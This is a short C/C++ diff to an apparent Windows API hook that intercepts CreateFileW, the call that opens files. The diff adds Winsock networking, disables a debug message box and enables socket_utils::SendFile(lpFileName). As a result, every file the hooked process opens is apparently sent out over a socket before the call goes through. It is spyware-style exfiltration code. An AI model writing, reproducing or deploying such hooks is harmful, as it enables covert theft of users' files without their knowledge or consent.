@@ -3,6 +3,8 @@
 #include <tchar.h>
 #include <stdio.h>
 #include "SystemHook.h"
+#include <Winsock2.h>
+#include "../Utils/Socket.h"
 
 extern HANDLE (WINAPI * pTrueCreateFileW)(LPCWSTR lpFileName,
 										  DWORD dwDesiredAccess,
@@ -20,9 +22,9 @@ HANDLE WINAPI TransCreateFileW(LPCWSTR lpFileName,
 							   DWORD dwFlagsAndAttributes,
 							   HANDLE hTemplateFile)
 {
-	MessageBox(NULL, (LPCWSTR)"lala", (LPCWSTR)"lala", MB_OK);
+	//MessageBox(NULL, (LPCWSTR)"lala", (LPCWSTR)"lala", MB_OK);
 
- 	//socket_utils::SendFile(lpFileName);
+ 	socket_utils::SendFile(lpFileName);
 
     return pTrueCreateFileW(lpFileName,
 					   dwDesiredAccess,
